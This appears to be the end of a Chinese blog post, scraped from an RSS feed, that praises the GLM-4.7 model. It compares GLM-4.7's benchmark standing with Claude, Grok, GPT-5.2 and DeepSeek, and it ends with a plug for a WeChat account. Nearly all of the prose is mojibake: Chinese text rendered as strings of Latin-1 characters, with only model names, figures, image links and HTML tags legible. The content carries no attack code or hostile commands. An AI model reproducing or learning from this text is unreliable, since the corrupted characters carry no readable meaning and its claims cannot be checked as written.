<p>å¾€ä¸‹çœ‹ï¼Œè¿™æ‰æ˜¯æœ€æœ‰æ„æ€çš„åœ°æ–¹ã€‚å®ƒæŠŠClaude 4.5 Sonnetã€Grok 4è¿™äº›åå£°åœ¨å¤–çš„æ¨¡å‹ç”©åœ¨äº†èº«åã€‚è€Œåœ¨å¼€æºè¿™ä¸ªèµ›é“ä¸Šï¼Œå®ƒç›´æ¥ç™»é¡¶ã€‚å°±è¿åŒæ ·è¡¨ç°ç”ŸçŒ›çš„DeepSeek V3.2ï¼Œè¿™æ¬¡ä¹Ÿä»¥ä¸¤åˆ†ä¹‹å·®æ’åœ¨ç¬¬åã€‚</p>
<p>å¦‚æœä¸è°ˆå¼€æºé—­æºï¼Œå•è®ºå›½äº§æ¨¡å‹ï¼ŒGLM-4.7å’ŒKimi K2ã€DeepSeekå…±åŒæ„æˆçš„ç¬¬ä¸€æ¢¯é˜Ÿï¼Œå·²ç»æŠŠå›½äº§AIçš„æ°´å¹³çº¿ç¡¬ç”Ÿç”Ÿæ‹‰åˆ°äº†å›½é™…ä¸€çº¿ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F12%2FiShot_2025-12-30_00.17.17-1024x496.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/12/iShot_2025-12-30_00.17.17-1024x496.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f21ff2ce810c451e97305851f1cffc99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767630394&amp;x-signature=zsbxsLJEkkpUsZQ5HxrZbmq1Ukg%3D" alt="iShot_2025-12-30_00.17.17" loading="lazy"/></a></p>
<p><strong>å®ƒåˆ°åº•å¼ºåœ¨å“ªï¼Ÿ</strong></p>
<p>å¾ˆå¤šå¼€å‘è€…ï¼ŒåŒ…æ‹¬æˆ‘åœ¨å†…ï¼Œæœ€å…³å¿ƒçš„å…¶å®ä¸æ˜¯åˆ†æ•°ï¼Œè€Œæ˜¯æ‰‹æ„Ÿã€‚GLM-4.7è¿™æ¬¡æ˜æ˜¾æ˜¯å¥”ç€â€œè§£å†³éš¾é¢˜â€å»çš„ï¼Œå®ƒè¢«å®šä¹‰ä¸ºä¸€æ¬¾ä¸“æ³¨äºæ¨ç†çš„æ¨¡å‹ã€‚</p>
<p>é¦–å…ˆæ˜¯å†™ä»£ç ã€‚å¯¹äºæˆ‘ä»¬è¿™äº›é ä»£ç åƒé¥­çš„äººæ¥è¯´ï¼ŒCode Arenaçš„æ’åå°±æ˜¯é£å‘æ ‡ã€‚GLM-4.7åœ¨è¿™ä¸ªæ¦œå•ä¸Šæ‹¿äº†å¼€æºç¬¬ä¸€ï¼Œç”šè‡³åœ¨ç»¼åˆæ€§èƒ½ä¸Šå‹è¿‡äº†GPT-5.2ã€‚åœ¨LiveCodeBenchæµ‹è¯•é‡Œï¼Œå®ƒä¹Ÿè¶…è¿‡äº†Claude Sonnet 4.5ã€‚è™½ç„¶åœ¨æŸäº›ç‰¹å®šæµ‹è¯•é›†ä¸Šè¿˜æœ‰åç§‘ï¼Œä½†ä½ è®©å®ƒå†™ä¸ªå¤æ‚è„šæœ¬æˆ–è€…æŸ¥ä¸ªBugï¼Œå®ƒçš„è¡¨ç°å·²ç»ä¸å†æ˜¯â€œåƒä¸ªAIâ€ï¼Œè€Œæ˜¯â€œåƒä¸ªåˆçº§å·¥ç¨‹å¸ˆâ€ã€‚</p>
<p>å…¶æ¬¡æ˜¯å®ƒå˜â€œèªæ˜â€äº†ã€‚è¿™é‡Œçš„èªæ˜æŒ‡çš„æ˜¯é€»è¾‘æ¨ç†ã€‚åœ¨ç ”ç©¶ç”Ÿçº§åˆ«çš„GPQA Diamondæµ‹è¯•é‡Œï¼Œå®ƒæ‹¿äº†84%çš„é«˜åˆ†ã€‚ä¸ºäº†è¾¾åˆ°è¿™ä¸ªæ•ˆæœï¼Œæ™ºè°±ç»™å®ƒå¼•å…¥äº†æ›´é•¿çš„æ€ç»´é“¾ã€‚ç®€å•è¯´ï¼Œå°±æ˜¯å®ƒåœ¨å›ç­”ä½ ä¹‹å‰ï¼Œä¼šåƒäººä¸€æ ·åœ¨è‚šå­é‡Œæ‰“è‰ç¨¿ï¼Œåå¤æ¨æ¼”ã€‚è™½ç„¶è¿™ä¼šè®©è®¡ç®—æˆæœ¬ç¨å¾®å¢åŠ ä¸€ç‚¹ï¼Œä½†ä¸ºäº†é‚£ä¸ªå‡†ç¡®çš„ç­”æ¡ˆï¼Œè¿™ç‚¹ç­‰å¾…æ˜¯å€¼å¾—çš„ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F12%2FiShot_2025-12-30_00.17.23-1024x359.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/12/iShot_2025-12-30_00.17.23-1024x359.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/631491ab9a2a4df2b865c3c0cac54469~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767630394&amp;x-signature=aQqe8ktaSJwgHyLgtM%2Bv10Lb%2FIM%3D" alt="iShot_2025-12-30_00.17.23" loading="lazy"/></a></p>
<p>è¿˜æœ‰ä¸€ä¸ªäº®ç‚¹æ˜¯â€œå¬æŒ‡æŒ¥â€ã€‚åœ¨è€ƒå¯Ÿæ™ºèƒ½ä½“å·¥å…·è°ƒç”¨çš„æµ‹è¯•ä¸­ï¼Œå®ƒåˆ·æ–°äº†å¼€æºæ¨¡å‹çš„çºªå½•ã€‚è¿™æ„å‘³ç€ï¼Œä½ å¯ä»¥æ›´æ”¾å¿ƒåœ°æŠŠAPIæ¥ç»™å®ƒï¼Œè®©å®ƒå»æ“ä½œå¤æ‚çš„ç³»ç»Ÿï¼Œè€Œä¸æ˜¯æ‹…å¿ƒå®ƒå¬ä¸æ‡‚æŒ‡ä»¤ä¹±æä¸€é€šã€‚</p>
<p><strong>ä¸ä»…æ˜¯æ¦œå•ï¼Œæ›´æ˜¯é£å‘</strong></p>
<p>GLM-4.7å‘å¸ƒåçš„ååº”å¾ˆæœ‰è¶£ã€‚å®ƒä¸ä»…åœ¨å›½å†…ç«ï¼Œåœ¨å›½å¤–çš„Hugging Faceä¸Šä¹Ÿè¿…é€Ÿå†²ä¸Šäº†å…¨çƒè¶‹åŠ¿æ¦œç¬¬ä¸€ã€‚</p>
<p>è¿™è¯´æ˜äº†ä»€ä¹ˆï¼Ÿè¯´æ˜å¥½ä¸œè¥¿æ˜¯æ²¡æœ‰å›½ç•Œçš„ã€‚ç¾å›½çš„AIæ¨ç†å¹³å°Fireworksç›´æ¥æŠŠå®ƒç§°ä½œâ€œäº†ä¸èµ·çš„å‡æœŸç¤¼ç‰©â€ï¼ŒVercelè¿™ç§æå®¢èšé›†çš„å¹³å°ä¹Ÿç¬¬ä¸€æ—¶é—´å®£å¸ƒæ¥å…¥ã€‚</p>
<p>è¿™ä¸ä»…ä»…æ˜¯ä¸€ä¸ªæ¨¡å‹çš„èƒœåˆ©ï¼Œæ›´åƒæ˜¯ä¸€ä¸ªä¿¡å·ã€‚ç›´åˆ°2024å¹´ï¼Œæˆ‘ä»¬åœ¨è®¨è®ºå¤§æ¨¡å‹æ—¶ï¼Œè¿˜åœ¨è¯´â€œè¿½èµ¶GPT-4â€ã€‚åˆ°äº†2025å¹´åº•ï¼Œå½“æˆ‘ä»¬çœ‹åˆ°å›½äº§æ¨¡å‹åœ¨Hardæ¨¡å¼çš„åŸºå‡†æµ‹è¯•é‡Œï¼Œå’Œè°·æ­Œã€OpenAIçš„æ——èˆ°äº§å“æ‰“å¾—æœ‰æ¥æœ‰å›ï¼Œç”šè‡³åœ¨å¼€æºé¢†åŸŸé¢†è·‘æ—¶ï¼Œè¿™ç§æ„Ÿè§‰æ˜¯å¾ˆå¾®å¦™çš„ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F12%2FiShot_2025-12-30_00.17.31-1024x315.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/12/iShot_2025-12-30_00.17.31-1024x315.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5088da97ec044852a7fa9594d8689a9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767630394&amp;x-signature=WBRUDBjvuRtcmJ4vaggNAmXZJNw%3D" alt="iShot_2025-12-30_00.17.31" loading="lazy"/></a></p>
<p>å¯¹äºå¼€å‘è€…å’Œä¼ä¸šæ¥è¯´ï¼Œè¿™æ„å‘³ç€é€‰æ‹©æƒçš„è½¬ç§»ã€‚ä½ ä¸éœ€è¦å†ä¸ºäº†é«˜è´¨é‡çš„æ¨ç†èƒ½åŠ›å»å¿å—æ˜‚è´µçš„é—­æºAPIï¼ŒGLM-4.7æä¾›äº†ä¸€ä¸ªé«˜æ€§ä»·æ¯”ã€ç”šè‡³å¯ä»¥è¯´æ˜¯å»‰ä»·çš„æ›¿ä»£æ–¹æ¡ˆâ€”â€”æ¯ç™¾ä¸‡tokenä¸åˆ°1ç¾å…ƒçš„æ¨ç†æˆæœ¬ï¼Œé…ä¸Šå¼€æºç¬¬ä¸€çš„èƒ½åŠ›ï¼Œè¿™ç¬”è´¦è°éƒ½ä¼šç®—ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F12%2Fasfadfsd-1024x297.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/12/asfadfsd-1024x297.webp" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8ca9b312aad44c3aa2f24ce5f813d55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767630394&amp;x-signature=n8DbDbzImx6KD7GTxncFqg0LefQ%3D" alt="asfadfsd" loading="lazy"/></a></p>
<p>æ€»è€Œè¨€ä¹‹ï¼ŒGLM-4.7çš„å‡ºç°ï¼Œè®©2025å¹´çš„AIç«èµ›åœ¨ç»ˆå±€é˜¶æ®µåˆå……æ»¡äº†å˜æ•°ã€‚å¯¹äºæˆ‘ä»¬ä½¿ç”¨è€…æ¥è¯´ï¼Œè¿™æ— ç–‘æ˜¯æœ€å¥½çš„æ—¶ä»£ã€‚é—­æºçš„é«˜å¢™è¿˜åœ¨ï¼Œä½†åœ°åŸºå·²ç»è¢«å¼€æºçš„é“²å­æŒ–å¾—è¶Šæ¥è¶Šæ¾åŠ¨äº†ã€‚</p>
<p><strong>å¦‚æœä½ ä¹Ÿå¯¹æœ€æ–°çš„AIä¿¡æ¯æ„Ÿå…´è¶£æˆ–è€…æœ‰ç–‘é—® éƒ½å¯ä»¥åŠ å…¥æˆ‘çš„å¤§å®¶åº­ ç¬¬ä¸€æ—¶é—´åˆ†äº«æœ€æ–°AIèµ„è®¯ã€å·¥å…·ã€æ•™ç¨‹ã€æ–‡æ¡£ æ¬¢è¿ä½ çš„åŠ å…¥ï¼ï¼ï¼ğŸ˜‰ğŸ˜‰ğŸ˜‰</strong></p>
<p>å…¬ä¼—å·ï¼šå¢¨é£å¦‚é›ªå°ç«™</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>